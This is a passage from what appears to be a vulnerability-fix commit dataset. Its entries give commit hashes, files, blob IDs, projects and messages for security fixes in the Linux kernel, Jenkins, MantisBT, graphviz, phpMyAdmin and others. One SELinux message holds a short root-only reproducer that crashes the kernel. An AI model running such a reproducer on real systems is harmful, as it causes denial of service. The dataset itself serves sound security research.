Blob(s) In Commit: 
    375406c3789e8154b5eec38efd3c3ad7492ed342
Blob(s) Before Fix: 
    0bfb31a229af5fc05579593e3ea83568b88cf3bb
    48a00ec47cf41c4a2f9da8ee1adca05f29aba363
Projects:
    5hadowblad3_file
Commit Message for f97486ef5dc3e8735440edc4fc8808c63e1a3ef0:
CVE-2014-0207: Prevent 0 element vectors and vectors longer than the number of properties from accessing random memory.

======================================================================
Commit With Fix: 
    83f8306117115729ac9346523762c0c396251eb5
File(s) In Commit: 
    lib/Email/Address.pm
Blob(s) In Commit: 
    1e0feb80f8284bac002e1541279cdbff4a8afeda
Blob(s) Before Fix: 
    acece12ee7dbfd772ebf2fa39b9b44334298b2bd
Projects:
    ruz_email-address
Commit Message for 83f8306117115729ac9346523762c0c396251eb5:
quoted part can be empty

======================================================================
Commit With Fix: 
    3ed749263abe3d69fa3626d142a5789dcb5a5684
File(s) In Commit: 
    src/lib/Libdis/disrsi_.c
Blob(s) In Commit: 
    154514c278628eeacd8a44ab06e1eb6e3c20165d
Blob(s) Before Fix: 
    69edd28034b3e832797dbf0e1474ff7d9eddd820
Projects:
    AlbertDeFusco_torque
Commit Message for 3ed749263abe3d69fa3626d142a5789dcb5a5684:
Merge pull request #171 into 2.5-fixes.

======================================================================
Commit With Fix: 
    7aaddf52cd98589fb0c3ab72a393f8411838438a
File(s) In Commit: 
    lib/cgraph/scan.l
Blob(s) In Commit: 
    2efd203cce1bcffeed860100f15776f75ef8daef
Blob(s) Before Fix: 
    3cfde0fddf3bda218b5647859df08d2f44859b90
Projects:
    Accacio_graphviz
Commit Message for 7aaddf52cd98589fb0c3ab72a393f8411838438a:
Fix buffer overflow problem when reporting a syntax error with a very long input line

======================================================================
Commit With Fix: 
    d266bb2b4154d11c27252b56d86963aef4434750
File(s) In Commit: 
    lib/cgraph/scan.l
Blob(s) In Commit: 
    212967c709ac9a277222985e9f192e1a6c433984
Blob(s) Before Fix: 
    3efe1d5f4ade3e24ed85032b1753cb9c00ddc384
Projects:
    Accacio_graphviz
Commit Message for d266bb2b4154d11c27252b56d86963aef4434750:
Prevent possible buffer overflow in yyerror()

======================================================================
Commit With Fix: 
    1d1bdec6318746f6f19f245db589eddc887ae8ff
File(s) In Commit: 
    lib/cgraph/scan.l
Blob(s) In Commit: 
    d065b61fbaa7ab97fcb7fc573a3a2c5b27a2fadb
Blob(s) Before Fix: 
    212967c709ac9a277222985e9f192e1a6c433984
Projects:
    Accacio_graphviz
Commit Message for 1d1bdec6318746f6f19f245db589eddc887ae8ff:
Fix possible buffer overflow problem in chkNum of scanner.

======================================================================
Commit With Fix: 
    26bef1318adc1b3a530ecc807ef99346db2aa8b0
File(s) In Commit: 
    arch/x86/include/asm/fpu-internal.h
Blob(s) In Commit: 
    cea1c76d49bf5b04344bb17c353bab35869cf01a
Blob(s) Before Fix: 
    1ac1c009090d87806e23f0e7dd2db7b4ea2160dc
    1b2fc5cf1963362a760eb5f8b4298108915de336
    41ab26ea65648b43a910f97cd7903c8bbbc2516c
    4d0bda7b11e3b6715b026f5995183ddb4e218ae1
    4fa88154e4dec6d93eaeadbeb1d991a02e57f835
    5be9f879957f523ea72d7a3126a1c6b5b56db7eb
    6c0d79b793bf4a93a3fc1c6bb4fc6136279fd1ae
    75f4c6d6a33166cba09b0541ccf8012494a73e0c
    831dbb9c6c028537402bd65d46e94320a70ee7de
    92e05b6c84f801895b85ff718684a4e0ac0aa6c6
    c49a613c6452fc66afdf5de52572dc8d033a8fcc
    e25cc33ec54d5476dba4a46337ab893785e48783
    e72b2e41499e78d8b599231e2ccfcbf2027ddfa3
Projects:
    0-T-0_ps4-linux
    0day-ci_xen
Commit Message for 26bef1318adc1b3a530ecc807ef99346db2aa8b0:
x86, fpu, amd: Clear exceptions in AMD FXSAVE workaround\n\nBefore we do an EMMS in the AMD FXSAVE information leak workaround we need to clear any pending exceptions, otherwise we trap with a floating-point exception inside this code.\n\nReported-by: halfdog <me@halfdog.net> Tested-by: Borislav Petkov <bp@suse.de> Link: http://lkml.kernel.org/r/CA%2B55aFxQnY_PCG_n4=0w-VG=YLXL-yr7oMxyy0WU2gCBAf3ydg@mail.gmail.com Signed-off-by: H. Peter Anvin <hpa@zytor.com>

======================================================================
Commit With Fix: 
    96b340406724d87e4621284ebac5e059d67b2194
File(s) In Commit: 
    drivers/net/wan/farsync.c
Blob(s) In Commit: 
    bcfff0d62de4f2070d5ac644a3becfedb74e3462
Blob(s) Before Fix: 
    0f27f4c5bb7394bb6f950fcf5b13be25301e318f
    1a623183cbe54d63f8392f924953b127ded83c1f
    2dfa1478d7d148de14fb0ba129ed8d36a9109dab
    33265eb50420eee1f0cbef33c9d0f0e31889daa0
    3710427c3fe1d400afb01df47d2d51c69b157e4c
    3c9cbf908ec73cd95a75d59a289eef5e68e5f414
    3f0c4f268751030318dd920a2a81bf2ddd1d328d
    44541dbc5c28c3f04400755ff94f2bc8fc2c5f38
    56941d6547eb33388535ead21ffb808354027de2
    69b994f3b8c528406ef3f28c02147b0070a074e3
    7575b799ce5368751c76323e61107d8766df2400
    777d1a4e81b2cb0c43599e146e16d774e47abe66
    7a4c49145034be2260c7da8490839613ef841dba
    9d6082fc29ff7d3398f7c301746f30721b5a89cd
    b6271325f8035c33ebaabf5e172f9ef9725780ba
    ebb9f24eefb5e568f90b859e2b3e47028a868a70
Projects:
    0-T-0_ps4-linux
    0day-ci_xen
Commit Message for 96b340406724d87e4621284ebac5e059d67b2194:
farsync: fix info leak in ioctl\n\nThe fst_get_iface() code fails to initialize the two padding bytes of struct sync_serial_settings after the ->loopback member. Add an explicit memset(0) before filling the structure to avoid the info leak.\n\nSigned-off-by: Dan Carpenter <dan.carpenter@oracle.com> Signed-off-by: David S. Miller <davem@davemloft.net>

======================================================================
Commit With Fix: 
    2b13d06c9584b4eb773f1e80bbaedab9a1c344e1
File(s) In Commit: 
    drivers/net/wan/wanxl.c
Blob(s) In Commit: 
    4c0a69779b8980a16ccca5a90acc5ece605cf06a
Blob(s) Before Fix: 
    0c7317520ed396a2a2448a21b62e08cd1debdfc4
    1e7b47704ad9e15a3c64e47e7374c449bf9b7e79
    44b707197258948fa3351de4cc8ca246676d922c
    4ea89fe0006fd72b44a199cd812c7958a4c9d48b
    6a24a5a70cc7d4459e04e0348882f0324dd4fad3
    ccd496bf32d9a6b9963308de84e7274f30f20bc8
    db73a7be199f0183fef7f40fa50c013b1db8d263
    e73f138578468db3a83bd882856ce897a747f2c0
    feb7541b33fbb8191928581eaaacc024dc193e5c
Projects:
    0-T-0_ps4-linux
    0day-ci_xen
Commit Message for 2b13d06c9584b4eb773f1e80bbaedab9a1c344e1:
wanxl: fix info leak in ioctl\n\nThe wanxl_ioctl() code fails to initialize the two padding bytes of struct sync_serial_settings after the ->loopback member. Add an explicit memset(0) before filling the structure to avoid the info leak.\n\nSigned-off-by: Salva Peiró <speiro@ai2.upv.es> Signed-off-by: David S. Miller <davem@davemloft.net>

======================================================================
Commit With Fix: 
    8e3fbf870481eb53b2d3a322d1fc395ad8b367ed
File(s) In Commit: 
    drivers/net/hamradio/yam.c
Blob(s) In Commit: 
    61dd2447e1bb4eedb5d8e6b72abcf21e9f273afb
Blob(s) Before Fix: 
    0721e72f9299250c6c29f0e1d3f7f51affffe7e8
    1971411574db1c7ae2dd6549490ab6975e816cd1
    1a4729c36aa49d93f8e536cd98d4731df704621d
    4cf8f1017aad40bcb613c1922bdc9519f976f399
    5a6412ecce739b7c21b395705742d42e1da6e4c7
    5af1c3e5032addd1441722899d3ab1fb0b010ae9
    82529a2658d73cb1c22e00232bbd9865508fb063
    92a86547eeec867756f2e63784a319181a556fcf
    96a98d2ff1513e3c5f0b682ed8a5a0d5c3ba9118
    aaff07c10058520fdba0b9e419bc95d8219a381c
    b6891ada1d7b7b67311fc8f1e6b04115ba341d11
    b7e967540509b885c7338b877b3edd95ab633a3f
    c6645f1017afac08dff50c54b63203903bb51031
    e4260ab421f1e43151d3e7557b44317a85ac71bf
Projects:
    0-T-0_ps4-linux
    0day-ci_xen
Commit Message for 8e3fbf870481eb53b2d3a322d1fc395ad8b367ed:
hamradio/yam: fix info leak in ioctl\n\nThe yam_ioctl() code fails to initialise the cmd field of the struct yamdrv_ioctl_cfg. Add an explicit memset(0) before filling the structure to avoid the 4-byte info leak.\n\nSigned-off-by: Salva Peiró <speiro@ai2.upv.es> Signed-off-by: David S. Miller <davem@davemloft.net>

======================================================================
Commit With Fix: 
    6b81541fc1e5dd1c70614585c1a04d04ccdb3b19
File(s) In Commit: 
    setup/data/doorgets.zip
Blob(s) In Commit: 
    ba08c97d3281548decbed4617b01f92ab8b6f086
Blob(s) Before Fix: 
    cea1f35bd4bd016e4901858ee846bd7e3940125a
Projects:
    Semapp_doorGets
Commit Message for 6b81541fc1e5dd1c70614585c1a04d04ccdb3b19:
Patch sérurity

======================================================================
Commit With Fix: 
    fc9bbcd25b0b4f09bbd6339f710ad24c129d5d7c
File(s) In Commit: 
    rply/parsergenerator.py
Blob(s) In Commit: 
    bc81f190454fb9084720b3ffd98cb601dfae71a6
Blob(s) Before Fix: 
    f8acd74dd5f38da6a6c08fc89a82d546d62e7470
Projects:
    djc_rply
Commit Message for fc9bbcd25b0b4f09bbd6339f710ad24c129d5d7c:
The parser cache is now always handled in a per-user fashion.\n\nThis avoids issues with people providing malciious caches in a multi-user system.\n\nOriginally reported as: http://bugs.debian.org/cgi-bin/bugreport.cgi?bug=735263\n\nA CVE number has been requested

======================================================================
Commit With Fix: 
    00b4c17088fa56594d85fe46b6c6057bb3421102
File(s) In Commit: 
    api/soap/mc_file_api.php
Blob(s) In Commit: 
    b290c4de0ffc4dd3a99ed2a920945673f2091de0
Blob(s) Before Fix: 
    079fe03f8f34f67bac0c43de2f591fc0c9691152
Projects:
    01-Scripts_mantisbt
Commit Message for 00b4c17088fa56594d85fe46b6c6057bb3421102:
Fix CVE-2014-1608: mc_issue_attachment_get SQL injection\n\nUse of db_query() instead of db_query_bound() allowed SQL injection attacks due to unsanitized use of parameters within the query when using the SOAP API mc_issue_attachment_get.\n\nThis issue was reported by e-mail by Andrea Barisani from oCERT, on behalf of Martin Herfurt <martin.herfurt@nruns.com>, a security researcher at n.runs professionals GmbH, who discovered the issue during an audit at a customer's site.\n\nFixes #16879\n\nSigned-off-by: Damien Regad <dregad@mantisbt.org>\n\nConflicts: 	api/soap/mc_file_api.php

======================================================================
Commit With Fix: 
    2690d97ade05c5325cbf7c72b94b90d265659886
File(s) In Commit: 
    net/netfilter/nf_nat_irc.c
Blob(s) In Commit: 
    1fb2258c35357c8c6f5072ae6593de2d53ab9f03
Blob(s) Before Fix: 
    0648cb096bd87b2df3b84db5da8ff8fdbffc7018
    07e9a88e06389dabea2c0c595af41a714f2bdaec
    1fedee6e7fb6974300aeac0d86c2c360a29b6394
    24660d4ab4cd8e9ee710564c95c988be0ead8409
    3aa35a43100d576d6927637f03a7999ab4ac9dad
    5dd4a16513ca1eaf7d3efe2b717aa197bec88265
    61385bdb6131c510f78ba6130638e7c7d5234f17
    6203ea4437881f799ff94c2ca26c2eeb9a384ff4
    8039bcd607581c9b047ccd991f155e9a045d5384
    82543469b72a5692bcadc3a8882c4045fa0123ba
    88937eb45c90a8adad337d15c93829dd5f0f2704
    8974469ce2d393fddf2dd2dff3bb4d3bff14efb3
    c932f9ac67f6e41c9d9eb3cfd12c7e671ae2d269
    dfb7ef8845bdfcbe9898815ba55fabed5fe402b8
    e209b9ef503838f8f2cc86f9e875ea703e5a833d
    f02b3605823e5616bc70f128a896e76d8f984ff2
Projects:
    0-T-0_ps4-linux
    0day-ci_xen
Commit Message for 2690d97ade05c5325cbf7c72b94b90d265659886:
netfilter: nf_nat: fix access to uninitialized buffer in IRC NAT helper\n\nCommit 5901b6be885e attempted to introduce IPv6 support into IRC NAT helper. By doing so, the following code seemed to be removed by accident:\n\n  ip = ntohl(exp->master->tuplehash[IP_CT_DIR_REPLY].tuple.dst.u3.ip)    sprintf(buffer, "%u %u", ip, port)    pr_debug("nf_nat_irc: inserting '%s' == %pI4, port %u\n", buffer, &ip, port) \n\nThis leads to the fact that buffer[] was left uninitialized and contained some stack value. When we call nf_nat_mangle_tcp_packet(), we call strlen(buffer) on excatly this uninitialized buffer. If we are unlucky and the skb has enough tailroom, we overwrite resp. leak contents with values that sit on our stack into the packet and send that out to the receiver.\n\nSince the rather informal DCC spec [1] does not seem to specify IPv6 support right now, we log such occurences so that admins can act accordingly, and drop the packet. I've looked into XChat source, and IPv6 is not supported there: addresses are in u32 and print via %u format string.\n\nTherefore, restore old behaviour as in IPv4, use snprintf(). The IRC helper does not support IPv6 by now. By this, we can safely use strlen(buffer) in nf_nat_mangle_tcp_packet() and prevent a buffer overflow. Also simplify some code as we now have ct variable anyway.\n\n  [1] http://www.irchelp.org/irchelp/rfc/ctcpspec.html\n\nFixes: 5901b6be885e ("netfilter: nf_nat: support IPv6 in IRC NAT helper") Signed-off-by: Daniel Borkmann <dborkman@redhat.com> Cc: Harald Welte <laforge@gnumonks.org> Signed-off-by: Pablo Neira Ayuso <pablo@netfilter.org>

======================================================================
Commit With Fix: 
    ef87dbe7614341c2e7bfe8d32fcb7028cc97442c
File(s) In Commit: 
    drivers/block/floppy.c
Blob(s) In Commit: 
    12251a688871976cbcb5fc17a61b3c199fcfa787
Blob(s) Before Fix: 
    8f5565bf34cda31504e526ccc3d79d4e7fe20fd2
Projects:
    0-T-0_ps4-linux
Commit Message for ef87dbe7614341c2e7bfe8d32fcb7028cc97442c:
floppy: ignore kernel-only members in FDRAWCMD ioctl input\n\nAlways clear out these floppy_raw_cmd struct members after copying the entire structure from userspace so that the in-kernel version is always valid and never left in an interdeterminate state.\n\nSigned-off-by: Matthew Daley <mattd@bugfuzz.com> Signed-off-by: Linus Torvalds <torvalds@linux-foundation.org>

======================================================================
Commit With Fix: 
    2145e15e0557a01b9195d1c7199a1b92cb9be81f
File(s) In Commit: 
    drivers/block/floppy.c
Blob(s) In Commit: 
    fa9bb742df6e0becfa8bca52576f17b5bdafe2bf
Blob(s) Before Fix: 
    000abe2f105c60f06d5fac31a2a4889cddd22b15
    04ceb7e2fadd6ca075d20ecd844c39bf1da07ff3
    12251a688871976cbcb5fc17a61b3c199fcfa787
    2023043ce7c0e94b0e3c3618eb0787a9ad5ddb73
    2ddd64a9ffdee43429653806be3262a80c372240
    8f5565bf34cda31504e526ccc3d79d4e7fe20fd2
    a7d6347aaa7913b2a029014a95a2558d8360597e
    c20ebc4493e4865ab04501e6e7d4f721ca324755
    dab515cd77bf8e638c8821657a3f00fb700e9761
    dd9a261ee9d5d596d2904e31ace95978fd7b6b9d
Projects:
    0-T-0_ps4-linux
Commit Message for 2145e15e0557a01b9195d1c7199a1b92cb9be81f:
floppy: don't write kernel-only members to FDRAWCMD ioctl output\n\nDo not leak kernel-only floppy_raw_cmd structure members to userspace. This includes the linked-list pointer and the pointer to the allocated DMA space.\n\nSigned-off-by: Matthew Daley <mattd@bugfuzz.com> Signed-off-by: Linus Torvalds <torvalds@linux-foundation.org>

======================================================================
Commit With Fix: 
    e6a623460e5fc960ac3ee9f946d3106233fd28d8
File(s) In Commit: 
    drivers/media/media-device.c
Blob(s) In Commit: 
    703560fa5e73b456cbc0951ccb61957bdfecebac
Blob(s) Before Fix: 
    1957c0df08fdb5717acedbf17162774f8c75dd05
    298703fca3b5decfe484a7e449efef220524ab57
    2bb904f3ea486ac8ff548158a9f06affcd25b66a
    37a0f00b2bee8596d57fe4a86a94bfb9d472b79f
    6edc9ba81203698e9948c066ddfac2370a142b1d
    6f9eb94e85b387f78f144fd74c244e0e0859237a
    79715f9feb0a4215ec26ce5ed114608c565792c7
    88c1606fd5555f5b535d0d5068cef0e691c5cb85
    aa010435966eb54f44b9c46f3662b320ef56d020
    cce7e783876278cd4b8ebf5462da7f91f4fc964f
    d01fcb7e87c2558e1b2c48c504d7dda0efada8df
    d5a7a135f75d39d5bc2f6fb3366639dd6dc7ee34
    fdb5840f034ba7915c610e4c8a3bf9d6ccebf914
Projects:
    0-T-0_ps4-linux
Commit Message for e6a623460e5fc960ac3ee9f946d3106233fd28d8:
[media] media-device: fix infoleak in ioctl media_enum_entities()\n\nThis fixes CVE-2014-1739.\n\nSigned-off-by: Salva Peiró <speiro@ai2.upv.es> Acked-by: Laurent Pinchart <laurent.pinchart@ideasonboard.com> Cc: stable@vger.kernel.org Signed-off-by: Mauro Carvalho Chehab <m.chehab@samsung.com>

======================================================================
Commit With Fix: 
    2172fa709ab32ca60e86179dc67d0857be8e2c98
File(s) In Commit: 
    security/selinux/ss/services.c
Blob(s) In Commit: 
    f1e46d776544fc4694a78ad436f5d9b06ece5589
Blob(s) Before Fix: 
    539aadd964736c6adafaeb82501a8a047897438b
    d106733ad9878d6ee7543ff31c05a51f2c74b523
    fc5a63a05a1ccfea8092f5a95fda162e6239787f
Projects:
    0-T-0_ps4-linux
    0day-ci_xen
Commit Message for 2172fa709ab32ca60e86179dc67d0857be8e2c98:
SELinux:  Fix kernel BUG on empty security contexts.\n\nSetting an empty security context (length=0) on a file will lead to incorrectly dereferencing the type and other fields of the security context structure, yielding a kernel BUG. As a zero-length security context is never valid, just reject all such security contexts whether coming from userspace via setxattr or coming from the filesystem upon a getxattr request by SELinux.\n\nSetting a security context value (empty or otherwise) unknown to SELinux in the first place is only possible for a root process (CAP_MAC_ADMIN), and, if running SELinux in enforcing mode, only if the corresponding SELinux mac_admin permission is also granted to the domain by policy.  In Fedora policies, this is only allowed for specific domains such as livecd for setting down security contexts that are not defined in the build host policy.\n\nReproducer: su setenforce 0 touch foo setfattr -n security.selinux foo\n\nCaveat: Relabeling or removing foo after doing the above may not be possible without booting with SELinux disabled.  Any subsequent access to foo after doing the above will also trigger the BUG.\n\nBUG output from Matthew Thode: [  473.893141] ------------[ cut here ]------------ [  473.962110] kernel BUG at security/selinux/ss/services.c:654! [  473.995314] invalid opcode: 0000 [#6] SMP [  474.027196] Modules linked in: [  474.058118] CPU: 0 PID: 8138 Comm: ls Tainted: G      D   I 3.13.0-grsec #1 [  474.116637] Hardware name: Supermicro X8ST3/X8ST3, BIOS 2.0 07/29/10 [  474.149768] task: ffff8805f50cd010 ti: ffff8805f50cd488 task.ti: ffff8805f50cd488 [  474.183707] RIP: 0010:[<ffffffff814681c7>]  [<ffffffff814681c7>] context_struct_compute_av+0xce/0x308 [  474.219954] RSP: 0018:ffff8805c0ac3c38  EFLAGS: 00010246 [  474.252253] RAX: 0000000000000000 RBX: ffff8805c0ac3d94 RCX: 0000000000000100 [  474.287018] RDX: ffff8805e8aac000 RSI: 00000000ffffffff RDI: ffff8805e8aaa000 [  474.321199] RBP: ffff8805c0ac3cb8 R08: 0000000000000010 R09: 0000000000000006 [  474.357446] R10: 0000000000000000 R11: ffff8805c567a000 R12: 0000000000000006 [  474.419191] R13: ffff8805c2b74e88 R14: 00000000000001da R15: 0000000000000000 [  474.453816] FS:  00007f2e75220800(0000) GS:ffff88061fc00000(0000) knlGS:0000000000000000 [  474.489254] CS:  0010 DS: 0000 ES: 0000 CR0: 0000000080050033 [  474.522215] CR2: 00007f2e74716090 CR3: 00000005c085e000 CR4: 00000000000207f0 [  474.556058] Stack: [  474.584325]  ffff8805c0ac3c98 ffffffff811b549b ffff8805c0ac3c98 ffff8805f1190a40 [  474.618913]  ffff8805a6202f08 ffff8805c2b74e88 00068800d0464990 ffff8805e8aac860 [  474.653955]  ffff8805c0ac3cb8 000700068113833a ffff880606c75060 ffff8805c0ac3d94 [  474.690461] Call Trace: [  474.723779]  [<ffffffff811b549b>] ? lookup_fast+0x1cd/0x22a [  474.778049]  [<ffffffff81468824>] security_compute_av+0xf4/0x20b [  474.811398]  [<ffffffff8196f419>] avc_compute_av+0x2a/0x179 [  474.843813]  [<ffffffff8145727b>] avc_has_perm+0x45/0xf4 [  474.875694]  [<ffffffff81457d0e>] inode_has_perm+0x2a/0x31 [  474.907370]  [<ffffffff81457e76>] selinux_inode_getattr+0x3c/0x3e [  474.938726]  [<ffffffff81455cf6>] security_inode_getattr+0x1b/0x22 [  474.970036]  [<ffffffff811b057d>] vfs_getattr+0x19/0x2d [  475.000618]  [<ffffffff811b05e5>] vfs_fstatat+0x54/0x91 [  475.030402]  [<ffffffff811b063b>] vfs_lstat+0x19/0x1b [  475.061097]  [<ffffffff811b077e>] SyS_newlstat+0x15/0x30 [  475.094595]  [<ffffffff8113c5c1>] ? __audit_syscall_entry+0xa1/0xc3 [  475.148405]  [<ffffffff8197791e>] system_call_fastpath+0x16/0x1b [  475.179201] Code: 00 48 85 c0 48 89 45 b8 75 02 0f 0b 48 8b 45 a0 48 8b 3d 45 d0 b6 00 8b 40 08 89 c6 ff ce e8 d1 b0 06 00 48 85 c0 49 89 c7 75 02 <0f> 0b 48 8b 45 b8 4c 8b 28 eb 1e 49 8d 7d 08 be 80 01 00 00 e8 [  475.255884] RIP  [<ffffffff814681c7>] context_struct_compute_av+0xce/0x308 [  475.296120]  RSP <ffff8805c0ac3c38> [  475.328734] ---[ end trace f076482e9d754adc ]---\n\nReported-by:  Matthew Thode <mthode@mthode.org> Signed-off-by: Stephen Smalley <sds@tycho.nsa.gov> Cc: stable@vger.kernel.org Signed-off-by: Paul Moore <pmoore@redhat.com>

======================================================================
Commit With Fix: 
    968d5d5f486820bfa30af046f063b9f23304e14a
File(s) In Commit: 
    import.php
Blob(s) In Commit: 
    85a78142add597f9178276b18e152cea9a6301c7
Blob(s) Before Fix: 
    2a4f4e15e7019f6ba4f97fa9263e28ac95fd5ae6
    61ad4acfcafa92d41094a8f2bc320aa1091c4eb2
    6500330b91eac9e0bdffb02b496a7c47397d5b8b
    90047521001aec3acd0b29308070617f1f56db9a
    9d193ae63d511d4f9fe09695ae8ef0389cb3cf3a
    af829d95a697a9b9095b89465b47b59e24db8588
    d21c13af3eb3a2e52542256da803d6b8b26272e5
    ec564763672b123e1e74c58a2b5144951e8d3db9
    f95e763a0e889fa29f456a9da4e8d8263de7cae7
Projects:
    007durgesh219_phpmyadmin
Commit Message for 968d5d5f486820bfa30af046f063b9f23304e14a:
Sanitize filename in import message\n\nSigned-off-by: Michal Čihař <michal@cihar.com>

======================================================================
Commit With Fix: 
    263b4509ec4d47e0da3e753f85a39ea12d1eff24
File(s) In Commit: 
    fs/nfs/write.c
Blob(s) In Commit: 
    a44a87268a6ef640c454600873489cc4e4e1e058
Blob(s) Before Fix: 
    77a00c66c7d9f5241279c96b4d1a4ad6126d00a3
    ac1dc331ba31212108cd5c93352ecdb620122690
    c1d548211c31dfab94dec9252cc3d929cfe42daa
    c483cc50b82ee5aa77f80f0d057550526469f466
    f1bdb72547768deabc4d0cae87a3271a200e67fc
Projects:
    0-T-0_ps4-linux
    0day-ci_xen
Commit Message for 263b4509ec4d47e0da3e753f85a39ea12d1eff24:
nfs: always make sure page is up-to-date before extending a write to cover the entire page\n\nWe should always make sure the cached page is up-to-date when we're determining whether we can extend a write to cover the full page -- even if we've received a write delegation from the server.\n\nCommit c7559663 added logic to skip this check if we have a write delegation, which can lead to data corruption such as the following scenario if client B receives a write delegation from the NFS server:\n\nClient A:     # echo 123456789 > /mnt/file\n\nClient B:     # echo abcdefghi >> /mnt/file     # cat /mnt/file     0�D0�abcdefghi\n\nJust because we hold a write delegation doesn't mean that we've read in the entire page contents.\n\nCc: <stable@vger.kernel.org> # v3.11+ Signed-off-by: Scott Mayhew <smayhew@redhat.com> Signed-off-by: Trond Myklebust <trond.myklebust@primarydata.com>

======================================================================
Commit With Fix: 
    8d7f6690cedb83456edd41c9bd583783f0703bf0
File(s) In Commit: 
    arch/s390/kernel/head64.S
Blob(s) In Commit: 
    d7c00507568a73e8f5acb45014f366154f839980
Blob(s) Before Fix: 
    03c2b469c4725172e4c6750cb8bcb0fb4edea075
    1ad2407c7f7590fea27a8e94d541be5179161602
    31c91f24e5624389b34017c45fd44dad3b11114f
    482d3526e32b290311151a17954f2c55ce41e15b
    58b719fa8067a5b7e2ec428c0babc758c6dc0eb4
    78be2459c9a15fd8270c48cabaa7a1d2ac990b39
    791cb9000e8658fdb6b17cce1550e88ddf1055cc
    8366793bc371522117fe869159a3c8cd8f39add3
    99348c0eaa4105a8e8e000be3182911da58b61a7
    ae5d492b069e3c92396395dc8bf6395f4785b420
    b9e25ae2579c9f04c3d4bb422cab012c943dda58
    c108af28bbe890b95ec606300b1129e893071b87
    cdef68717416cedce7b46d41599bde1f2be9821c
    edeabb28a1859c77b74284b9b2571bf2d9510911
Projects:
    0-T-0_ps4-linux
    0day-ci_xen
Commit Message for 8d7f6690cedb83456edd41c9bd583783f0703bf0:
s390: fix kernel crash due to linkage stack instructions\n\nThe kernel currently crashes with a low-address-protection exception if a user space process executes an instruction that tries to use the linkage stack. Set the base-ASTE origin and the subspace-ASTE origin of the dispatchable-unit-control-table to point to a dummy ASTE. Set up control register 15 to point to an empty linkage stack with no room left.\n\nA user space process with a linkage stack instruction will still crash but with a different exception which is correctly translated to a segmentation fault instead of a kernel oops.\n\nSigned-off-by: Martin Schwidefsky <schwidefsky@de.ibm.com>

======================================================================
Commit With Fix: 
    ad38d8480f20ce3cbf8fec3e2003bc83efda4f7d
File(s) In Commit: 
    core/src/main/java/hudson/cli/CreateJobCommand.java
Blob(s) In Commit: 
    02dd6ae55ebdf064d09f79e5b094a2192f2bf74c
Blob(s) Before Fix: 
    45671d1ccedea158464da70058b9fe2d5862ce12
    db73c30b51a03816d5a9288aab32b9d4ff3ca618
Projects:
    01user_jenkins
Commit Message for ad38d8480f20ce3cbf8fec3e2003bc83efda4f7d:
[FIXED SECURITY-108] Check job name created via CLI

======================================================================
Commit With Fix: 
    5548b5220cfd496831b5721124189ff18fbb12a3
File(s) In Commit: 
    core/src/main/java/jenkins/security/ApiTokenFilter.java
Blob(s) In Commit: 
    b1078e6240c6344d186feffd9a8f65a713f802fe
Blob(s) Before Fix: 
    02a40b206c73344402ad1f264eead124ff18dc6f
    630ae5ec0482b120f84f5b841883ffea191e95f1
Projects:
    01user_jenkins
Commit Message for 5548b5220cfd496831b5721124189ff18fbb12a3:
[FIXED SECURITY-89] When checking an API token, verify that the user actually exists.

======================================================================
Commit With Fix: 
    16931bd7bf7560e26ef98328b8e95e803d0e90f6
File(s) In Commit: 
    core/src/main/resources/lib/layout/layout.jelly
Blob(s) In Commit: 
    c31d4c2a31c7c22c23572f0dd9b4c98db065191c
Blob(s) Before Fix: 
    5d8aa8d449569e14fc5fddadcddfaead7e4e2651
Projects:
    01user_jenkins
Commit Message for 16931bd7bf7560e26ef98328b8e95e803d0e90f6:
[FIXED SECURITY-80] Add X-Frame-Options head to prevent clickjacking attacks

======================================================================
Commit With Fix: 
    fbf96734470caba9364f04e0b77b0bae7293a1ec
File(s) In Commit: 
    core/src/main/java/hudson/security/HudsonPrivateSecurityRealm.java
Blob(s) In Commit: 
    de7863ecf5e8c3845af5d5d5057104249654e6a7
Blob(s) Before Fix: 
    a6568631dd159107836d0b991e4bf9bd428a318e
Projects:
    01user_jenkins
Commit Message for fbf96734470caba9364f04e0b77b0bae7293a1ec:
[FIXED SECURITY-79] Prevent (private security realm) usernames from being guessed.

======================================================================
Commit With Fix: 
    8ac74c350779921598f9d5edfed39dd35de8842a
File(s) In Commit: 
    core/src/main/java/hudson/security/AuthenticationProcessingFilter2.java
Blob(s) In Commit: 
    1819c771f475903678306c104b1a6167288f59e5
Blob(s) Before Fix: 
    7f282199e88847d60c42cfc3111fd914cb550cea
    faef1690a62c38a25d73cbfbd1d24cb8901f7fae
Projects:
    01user_jenkins
Commit Message for 8ac74c350779921598f9d5edfed39dd35de8842a:
[FIXED SECURITY-75] Invalidate session after login to avoid session fixation

======================================================================
Commit With Fix: 
    5d57c855f3147bfc5e7fda9252317b428a700014
File(s) In Commit: 
    core/src/main/java/hudson/model/Cause.java
Blob(s) In Commit: 
    52b2eeffb13db8afb19cf1bf125e39af39bbf294
Blob(s) Before Fix: 
    4ccab0333893604d8ab4abb33d68dbc091b22308
Projects:
    01user_jenkins
Commit Message for 5d57c855f3147bfc5e7fda9252317b428a700014:
[FIXED SECURITY-74] Apply markup formatter to remote cause note.

======================================================================
Commit With Fix: 
    0530a6645aac10fec005614211660e98db44b5eb
File(s) In Commit: 
    core/src/main/java/hudson/util/RemotingDiagnostics.java
Blob(s) In Commit: 
    8f014bbcf830319e1e7db2d1f7e0437133569068
Blob(s) Before Fix: 
    408c9931f4d998b760f625fda817f6f526bdb999
Projects:
    01user_jenkins
Commit Message for 0530a6645aac10fec005614211660e98db44b5eb:
[FIXED SECURITY-73] Require RUN_SCRIPTS for /heapDump.

======================================================================
Commit With Fix: 
    506a44194a9016406c752ad8e010c01aeffc18cc
File(s) In Commit: 
    hphp/util/light-process.cpp
Blob(s) In Commit: 
    16c834acae4c2d3189b26ba89335f18a8d1b2893
Blob(s) Before Fix: 
    9a4980ca1d66f1f76a4141490fe51c2d010f4c67
Projects:
    10000TB_hhvm
Commit Message for 506a44194a9016406c752ad8e010c01aeffc18cc:
Fix escaping in LightProcess protocol\n\nThe LightProcess mechanism sends newline terminated commands over a pipe, but didn't escape newlines contained in the payload.\n\nReviewed By: otto\n\nDifferential Revision: D1184482

======================================================================
Commit With Fix: 
    447558595a3650db2886cd2f416ad0beba965801
File(s) In Commit: 
    src/softmagic.c
Blob(s) In Commit: 
    ac9c18bdcabf40af9f84bd6af05d80c491739e7a
Blob(s) Before Fix: 
    ec713649ba1d6c7da8426a9162849f4772033dd0
Projects:
    5hadowblad3_file
Commit Message for 447558595a3650db2886cd2f416ad0beba965801:
PR/313: Aaron Reffett: Check properly for exceeding the offset.

======================================================================
Commit With Fix: 
    b22f5126a24b3b2f15448c3f2a254fc10cbc2b92
